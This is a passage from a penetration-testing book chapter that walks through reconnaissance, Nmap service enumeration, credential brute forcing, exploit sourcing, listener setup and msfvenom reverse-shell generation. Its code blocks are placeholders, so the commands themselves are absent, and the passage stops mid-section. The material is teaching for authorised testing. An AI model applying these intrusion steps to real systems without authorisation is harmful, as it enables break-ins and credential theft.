- en: Network Penetration Testing
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Be prepared—this is going to be a massive chapter! In fact, this is a book's
    worth of information in one chapter. Why? Because I want it to be a reference
    for you to use in your future career. Network vulnerability assessment and penetration
    testing will be one of your major tasks when working in web application security.
    Say that you deploy a web application on a vulnerable operating system that is
    accessible from the internet—this would be a Christmas gift for a hacker who wants
    to get a remote shell into your company's server.
  prefs: []
  type: TYPE_NORMAL
- en: Most of the internet security books on the market talk about this subject (penetration
    testing with Kali Linux), so I asked myself, *Before writing this chapter*, *how
    can I use it myself for my own daily security tests?*. I want it to be useful
    for you as much as possible so you can use it in practice for your daily job and
    for your penetration testing certifications as well.
  prefs: []
  type: TYPE_NORMAL
- en: You can use both this and the following chapter as a cheat sheet to practice
    your penetration testing skills. You can use the** Capture the Flag** (**CTF**)
    methodology by downloading vulnerable virtual machines and trying to exploit them
    to enhance your hacking skills. A good source to download these VMs from is: [http://www.vulnhub.com](http://www.vulnhub.com).
  prefs: []
  type: TYPE_NORMAL
- en: This book is for intermediate to advanced professionals who are seeking to enhance
    and deepen their knowledge. If you feel that the information in this chapter is
    overwhelming and not clear, then I invite you to watch a few online courses for
    beginners in penetration testing .
  prefs: []
  type: TYPE_NORMAL
- en: 'Let''s go straight ahead and start this chapter, which will cover the following
    topics:'
  prefs: []
  type: TYPE_NORMAL
- en: Passive information gathering
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Services enumeration
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Network vulnerability assessment
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Vulnerability exploitation
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Privilege escalation
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Passive information gathering – reconnaissance – OSINT
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In the first step before the penetration testing starts, you will need to passively collect
    the information about the company in scope. To accomplish this task, you will
    use the web, along with some automated tools that call the web at the backend
    as well. This phase is also called the collection of **Open Source Intelligence**(**OSINT**).
    OSINT refers to the information collected from the internet. Another name for
    this phase used by security professionals is **reconnaissance**. To be honest,
    they all refer to the same task, but you need to be aware of the different names
    used to describe this stage.
  prefs: []
  type: TYPE_NORMAL
- en: If your target (whether it's your client's target or that of the organisation
    for which you work) is an external web application, then you can execute the information-gathering
    phase, but if your target is an intranet or a brand new website that has not been
    deployed into the production environment yet, then the OSINT is useless, unless
    your client (or your boss) has asked you for this task separately.
  prefs: []
  type: TYPE_NORMAL
- en: Information gathering, or OSINT, usually starts with online research as to the
    target's online presence.
  prefs: []
  type: TYPE_NORMAL
- en: 'You will use public information to gather the following information:'
  prefs: []
  type: TYPE_NORMAL
- en: 'Company information, including the following:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Location and addresses
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: Email addresses (for example, `support@yourclientdomain.com`)
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: Other companies acquired (in both directions—it could be that your client was
    acquired by another company, or vice versa)
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: Domain names (DNS)
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: Business type (banking, insurance, retail, and so on)
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: Company structure
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: Company's blog articles
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: Company's social network data
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: Cached contents on the web
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: Information leaks (for example, passwords, client PII, or any sensitive information
    that is not meant for the public)
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: 'Employee information, including the following:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Names
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: Email addresses
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: Phone numbers
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: Job position inside the company (for example, IT manager, QA engineer, and so
    on)
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: Social network data
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: 'Web application information gathering, including the following:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: The leak of web-based vulnerabilities on dumpsites
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: Web-page crawling
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: Programming languages used (for example, PHP, Java, or .NET)
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: Passive scanning using Burp (we will cover this topic in more detail in the
    next chapter)
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: A good place to start is the target's website. Here, you can find most of the
    information in the preceding list.
  prefs: []
  type: TYPE_NORMAL
- en: Web search engines
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Don''t just use Google as the only search engine for your online research (just
    type your target''s company name or domain name to get your search results). Other
    powerful search engines exist as well, including the following:'
  prefs: []
  type: TYPE_NORMAL
- en: '**Chinese search engine**: [http://www.baidu.com](http://www.baidu.com)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Russian search engine**: [http://yandex.com](http://yandex.com)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**General popular search engine**: [http://www.duckduckgo.com](http://www.duckduckgo.com)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'You can also use a dark and deep web search using the TOR network (use these
    search engines carefully as this technology is still evolving):'
  prefs: []
  type: TYPE_NORMAL
- en: '**Onion.City**: [http://onion.link/](http://onion.link/)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Not Evil**: [https://hss3uro2hsxfogfq.onion.to/](https://hss3uro2hsxfogfq.onion.to/)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Onion.To**: [https://tor2web.org/](https://tor2web.org/)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Duck Duck Go**: [https://3g2upl4pq6kufc4m.onion/](https://3g2upl4pq6kufc4m.onion/)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: To connect to the dark web, connect to a VPN first and then connect to the TOR
    network using the TOR browser.
  prefs: []
  type: TYPE_NORMAL
- en: Google Hacking Database – Google dorks
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Google allows us penetration testers to query its search engine to our liking
    in order to reveal sensitive information regarding our target. The reference for
    finding all the interesting queries is on the Exploit-DB website at [https://www.exploit-db.com/google-hacking-database/](https://www.exploit-db.com/google-hacking-database/).
  prefs: []
  type: TYPE_NORMAL
- en: 'What can you search on Google? With Google dorks, you can query the search
    engine in order to accomplish the following:'
  prefs: []
  type: TYPE_NORMAL
- en: Getting a foothold on a web server
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Revealing sensitive directories
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Searching for vulnerable files
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Searching for vulnerable servers
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Revealing verbose error messages
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Searching for a target network's vulnerability data
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Searching for miscellaneous devices that belong to your target (for example,
    IP cameras)
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Getting web server information
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Searching for files with credentials (username or passwords) and files with
    confidential information
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Searching for login pages (or admin pages)
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'Here''s a list of the most popular Google dorks queries:'
  prefs: []
  type: TYPE_NORMAL
- en: '**Search for domains/subdomains**: `site [target domain name]`'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Search for file**s: `filetype [ file extension]`'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Search for strings in the URL**: `inurl [ search criteria in the URL]`'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Search for strings in the title**: `intitle [search criteria in the title]`'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Remember that you can combine multiple queries together to get the desired results.
  prefs: []
  type: TYPE_NORMAL
- en: Online tools
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Some good websites exist on the internet that can be added to your arsenal:'
  prefs: []
  type: TYPE_NORMAL
- en: '**Explore online vulnerabilities for servers and IOT devices**: [https://www.shodan.io](https://www.shodan.io)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Get dumped leaked information**: [http://www.pastebin.com](http://www.pastebin.com)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Text and source code leak**: [https://github.com](https://github.com)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Online Swiss Army knife tools**: [https://www.dnsstuff.com](https://www.dnsstuff.com)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Find interesting information about your target website**:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[https://toolbar.netcraft.com/site_report?url=**[target domain name]**](https://toolbar.netcraft.com/site_report?url=%5Btarget%20domain%20name%5D)'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '[http://searchdns.netcraft.com](http://searchdns.netcraft.com)'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: Kali Linux tools
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Kali Linux contains so many tools for information gathering. Some of the tools
    can be removed from the Kali repository so they won't be installed by default.
    Most of the tools that I will list will be available for download from GitHub
    or a simple Google search (in case they are removed from the Kali Linux distribution
    in the future). Another option is to use the `apt-get install` command from your
    Terminal window to install the required tool.
  prefs: []
  type: TYPE_NORMAL
- en: WHOIS lookup
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Every domain name is registered in a public WHOIS database. Depending on the
    database that is queried, the response to a WHOIS request will reveal a lot of
    juicy information, including the following:'
  prefs: []
  type: TYPE_NORMAL
- en: Names
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Phone numbers
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Email addresses
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Physical addresses
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Domain expiry dates
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: DNS servers
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Example**:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE0]'
  prefs: []
  type: TYPE_PRE
- en: Domain name system – DNS enumeration
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: DNS enumeration will reveal information regarding domain names and IP addresses
    assigned to the target, as well as the route between us and the final destination.
  prefs: []
  type: TYPE_NORMAL
- en: In summary, the **Domain Name System** (**DNS**) is a database that resolves
    domain names (for example, `google.com`) to its IP addresses (`172.217.10.46`).
  prefs: []
  type: TYPE_NORMAL
- en: 'You will use the DNS information for the following reasons:'
  prefs: []
  type: TYPE_NORMAL
- en: To identify whether the DNS server allows a zone transfer. If it does, then
    it will reveal the hostnames and IP addresses of internet-accessible systems.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: By using a brute-force methodology, the tool allows us to identify new domain names
    or subdomains associated with the target.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Finding services that may be vulnerable (for example, FTP).
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Finding interesting remote administration panels.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Finding misconfigured and/or testing servers (`test.domain-name.com`).
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Tools/Examples**:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE1]'
  prefs: []
  type: TYPE_PRE
- en: Gathering email addresses
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: The `theharvester` script is a Python tool/script that searches for email addresses
    and domains using popular search engines.
  prefs: []
  type: TYPE_NORMAL
- en: '**Example**:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE2]'
  prefs: []
  type: TYPE_PRE
- en: Active information gathering – services enumeration
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: This phase is all about identifying the live hosts and the services running
    on those hosts. Remember, in this phase, we're still gathering information to
    use in order to understand our target. Some people in enterprise environments
    just skip this test and go straight to the vulnerability assessment by executing
    fancy scanners, such as Nessus or Nexpose. I don't like this approach myself,
    unless you're on a low budget for your tests (it's better than nothing).
  prefs: []
  type: TYPE_NORMAL
- en: 'This phase has four steps:'
  prefs: []
  type: TYPE_NORMAL
- en: Getting IP addresses/ranges from your client or employer (if it's an internal
    project, the project manager will help with this matter)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Identifying live hosts
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Listing the open ports/services on each host
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Probing each service for more information
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Check Appendices A, B, C, D, and E for penetration testing references.
  prefs: []
  type: TYPE_NORMAL
- en: Identifying live hosts
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Next, you will identify whether the host is up and running, or whether it''s
    protected by a firewall. My favorite tool for this phase (and the upcoming phases
    as well) is Nmap. I strongly suggest that you familiarize yourself with Nmap.
    The following commands initiate Nmap and another useful host identifier:'
  prefs: []
  type: TYPE_NORMAL
- en: '**Nmap ping scan**:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE3]'
  prefs: []
  type: TYPE_PRE
- en: '**Another tool**, **Netdiscover**:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE4]'
  prefs: []
  type: TYPE_PRE
- en: Identifying open ports/services
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'After a quick ping scan, we can leverage our methodology to reveal the open
    ports and services as well. We will also use the Nmap script to probe each service,
    using the following commands:'
  prefs: []
  type: TYPE_NORMAL
- en: '**TCP scan - intranet**:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE5]'
  prefs: []
  type: TYPE_PRE
- en: '**UDP scan - intranet**:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE6]'
  prefs: []
  type: TYPE_PRE
- en: '**TCP scan - from the internet (outside boundary)**:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE7]'
  prefs: []
  type: TYPE_PRE
- en: '**UDP scan - from the internet (outside boundary)**:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE8]'
  prefs: []
  type: TYPE_PRE
- en: Check out *Appendix A* for a cheat sheet of Nmap.
  prefs: []
  type: TYPE_NORMAL
- en: Service probing and enumeration
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'In the preceding step, we used the Nmap script to quickly probe each service
    that we found. In this step, we will take this information to the next step and
    try to probe aggressively. The Nmap scripts that we will use in the following
    examples are both very aggressive and time-consuming:'
  prefs: []
  type: TYPE_NORMAL
- en: '**Port TCP 21 – FTP**:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Nmap script probing**:'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE9]'
  prefs: []
  type: TYPE_PRE
- en: '**Credential brute force**:'
  prefs:
  - PREF_UL
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE10]'
  prefs: []
  type: TYPE_PRE
- en: '**Port TCP 22 – SSH**:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Nmap script probing**:'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE11]'
  prefs: []
  type: TYPE_PRE
- en: '**Credential brute force**:'
  prefs:
  - PREF_UL
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE12]'
  prefs: []
  type: TYPE_PRE
- en: '**Port TCP 23 – Telnet**:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Nmap script probing**:'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE13]'
  prefs: []
  type: TYPE_PRE
- en: '**Credential brute force**:'
  prefs:
  - PREF_UL
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE14]'
  prefs: []
  type: TYPE_PRE
- en: '**Port TCP 25 – SMTP**:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Nmap script probing**:'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE15]'
  prefs: []
  type: TYPE_PRE
- en: '**Connect to the server and execute the VRFY command**:'
  prefs:
  - PREF_UL
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE16]'
  prefs: []
  type: TYPE_PRE
- en: '**Port TCP/UDP 53 – DNS**:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Nmap script probing**:'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE17]'
  prefs: []
  type: TYPE_PRE
- en: '**Port TCP 80 – HTTP**:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Nmap script probing**:'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE18]'
  prefs: []
  type: TYPE_PRE
- en: '**Probing using Nikto**:'
  prefs:
  - PREF_UL
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE19]'
  prefs: []
  type: TYPE_PRE
- en: '**Probing using WhatWeb**:'
  prefs:
  - PREF_UL
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE20]'
  prefs: []
  type: TYPE_PRE
- en: '**Directory crawling**:'
  prefs:
  - PREF_UL
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE21]'
  prefs: []
  type: TYPE_PRE
- en: '**Port TCP 110 – POP3**:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Nmap script probing**:'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE22]'
  prefs: []
  type: TYPE_PRE
- en: '**Ports UDP ports 137, 138  TCP ports 137, 139 – Netbios & TCP 445 – Samba
    (SMB)**:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Nmap script probing**:'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE23]'
  prefs: []
  type: TYPE_PRE
- en: '**Using Enum4Linux to probe SMB**:'
  prefs:
  - PREF_UL
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE24]'
  prefs: []
  type: TYPE_PRE
- en: '**Using nmblookup to probe SMB**:'
  prefs:
  - PREF_UL
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE25]'
  prefs: []
  type: TYPE_PRE
- en: '**Netbios probing using nbtscan**:'
  prefs:
  - PREF_UL
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE26]'
  prefs: []
  type: TYPE_PRE
- en: '**Listing SMB shares**:'
  prefs:
  - PREF_UL
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE27]'
  prefs: []
  type: TYPE_PRE
- en: '**Connecting to a shared directory**:'
  prefs:
  - PREF_UL
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE28]'
  prefs: []
  type: TYPE_PRE
- en: '**Port UDP 161 – SNMP**:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Nmap script probing**:'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE29]'
  prefs: []
  type: TYPE_PRE
- en: '**Enumerating the MIB tree**:'
  prefs:
  - PREF_UL
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE30]'
  prefs: []
  type: TYPE_PRE
- en: '**Probing SNMP using the snmp-check tool**:'
  prefs:
  - PREF_UL
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE31]'
  prefs: []
  type: TYPE_PRE
- en: '**Port TCP 389 – LDAP**:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Nmap script probing**:'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE32]'
  prefs: []
  type: TYPE_PRE
- en: '**Port TCP 443 – HTTPS/SSL**:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Nmap script probing**:'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE33]'
  prefs: []
  type: TYPE_PRE
- en: '**Port TCP 1433 – Microsoft SQL Server (MSSQL)**:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Nmap script probing**:'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE34]'
  prefs: []
  type: TYPE_PRE
- en: '**Brute force for credentials**:'
  prefs:
  - PREF_UL
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE35]'
  prefs: []
  type: TYPE_PRE
- en: '**Port TCP 3306 – MySQL**:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Nmap script probing**:'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE36]'
  prefs: []
  type: TYPE_PRE
- en: '**Brute force for credentials**:'
  prefs:
  - PREF_UL
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE37]'
  prefs: []
  type: TYPE_PRE
- en: '**Port TCP/UDP 3389 – Remote Desktop Protocol (RDP)**:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Nmap script probing**:'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE38]'
  prefs: []
  type: TYPE_PRE
- en: '**Brute force for credentials**:'
  prefs:
  - PREF_UL
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE39]'
  prefs: []
  type: TYPE_PRE
- en: Vulnerability assessment
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In the previous section, we enumerated the services aggressively. Some of the
    Nmap scripts will check for vulnerabilities—for example, when entering the option
    `--script=http*`, Nmap, in this case, will execute all the HTTP scripts, including
    the ones that check for vulnerabilities, for example, `http-vuln-cve2010-2861`.
  prefs: []
  type: TYPE_NORMAL
- en: In reality, in an enterprise environment, we would use automatic scanners, either
    Nessus or Nexpose. Nowadays, these companies offer scanners on the cloud as well—for
    example, the Nexpose equivalent in the cloud is called InsightVM. We heavily rely
    on these scanners to identify the vulnerabilities in the network infrastructure.
    Your role is to take the results and make sure that these flaws exist—in other
    words, that they're not false positives.
  prefs: []
  type: TYPE_NORMAL
- en: OpenVas
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: What if you want to practice vulnerability assessment? You can install and use
    a free vulnerability assessor called OpenVas. To install it on Kali Linux, go
    to [https://www.kali.org/penetration-testing/openvas-vulnerability-scanning](https://www.kali.org/penetration-testing/openvas-vulnerability-scanning).
  prefs: []
  type: TYPE_NORMAL
- en: Do not forget to save the generated password while installing OpenVas. Generally,
    the password is displayed in the last step of the installation.
  prefs: []
  type: TYPE_NORMAL
- en: 'To scan an IP address or range using OpenVas, perform the following steps:'
  prefs: []
  type: TYPE_NORMAL
- en: Make sure that the OpenVas service has already started using `$ service openvas-manager
    start`.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Open it in the browser using `firefox https://127.0.0.1:9392`.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Enter the default username `admin` and the password that was generated for you
    in the installation process.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: In the menu, select the Configuration tab, then select Target.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Add a new target by clicking on the New Target button (the icon of the button
    is a blue star, generally located in the top-left corner of the screen).
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'In the new target window, make sure you fill in the following:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Target name
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: IP/range
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: Port list
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: After saving the target, select the Scans menu and click on the Tasks item.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Add a task using the New Tasks button (the blue star icon).
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Make sure that you choose the following options for the task:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Name
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: Specify the previously created Target
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: Choose the right Scan Config
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: After creating the task, it should appear in the Tasks main page.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Under the Actions column, click on the Start button (a green play icon).
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: The scanner will display the Done status (in the column) when it completes the
    task.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Under the Report column, click on the link to display the vulnerability results.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Before you start the exploitation phase, I encourage you to familiarize yourself
    with Metasploit. Check out *Appendix B* for a full cheat sheet of Metasploit.
  prefs: []
  type: TYPE_NORMAL
- en: Exploitation
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: The exploitation phase is accomplished by exploiting a vulnerability found on
    the target machine and getting a remote shell as well. That's it! Simple, right?
    Let's get started.
  prefs: []
  type: TYPE_NORMAL
- en: Finding exploits
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Generally speaking, 99% of the time, the vulnerability scanner will tell you
    where to find the exploit in order to replicate it from your end. Here''s where
    to find most of the exploits:'
  prefs: []
  type: TYPE_NORMAL
- en: Google it—it sounds simple, but it's my favorite method
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`Exploit-db` at [http://www.exploit-db.com](http://www.exploit-db.com)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: The searchsploit tool in Kali Linux
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Metasploit—use the `search` command to find it
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Security Focus at [http://www.securityfocus.com](http://www.securityfocus.com)
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Sometimes you will find them on GitHub, at [http://www.github.com](http://www.github.com)
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Listener setup
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Before uploading and executing the payload, you will need to set up and execute
    a listener on Kali Linux.
  prefs: []
  type: TYPE_NORMAL
- en: 'To create a listener using **Metasploit**, enter the following:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE40]'
  prefs: []
  type: TYPE_PRE
- en: 'To create a listener using **netcat**, use the following:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE41]'
  prefs: []
  type: TYPE_PRE
- en: Generating a shell payload using msfvenom
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'We will now discuss how we can go about generating a shell payload using `msfvenom`
    across different platforms:'
  prefs: []
  type: TYPE_NORMAL
- en: '**Linux**:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE42]'
  prefs: []
  type: TYPE_PRE
- en: '**Windows**:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE43]'
  prefs: []
  type: TYPE_PRE
- en: '**macOS**:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE44]'
  prefs: []
  type: TYPE_PRE
- en: '**PHP**:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE45]'
  prefs: []
  type: TYPE_PRE
- en: If you use `php`/`reverse_php`, then open the output file generated by `msfvenom`
    with an editor and add `<?php` at the beginning and  `?>`  at the end of the script.
  prefs: []
  type: TYPE_NORMAL
- en: '**ASP**:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE46]'
  prefs: []
  type: TYPE_PRE
- en: '**JSP**:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE47]'
  prefs: []
  type: TYPE_PRE
- en: Custom shells
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'If you don''t want to use `msfvenom`, then you can create your own custom shells.
    Here are some examples:'
  prefs: []
  type: TYPE_NORMAL
- en: '**Bash**'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE48]'
  prefs: []
  type: TYPE_PRE
- en: In the following examples, I will assume that my Kali IP is `10.1.1.100` and
    the listening port is `4444`.
  prefs: []
  type: TYPE_NORMAL
- en: '**PERL**'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[PRE49]'
  prefs: []
  type: TYPE_PRE
- en: '**Python**'
  prefs:
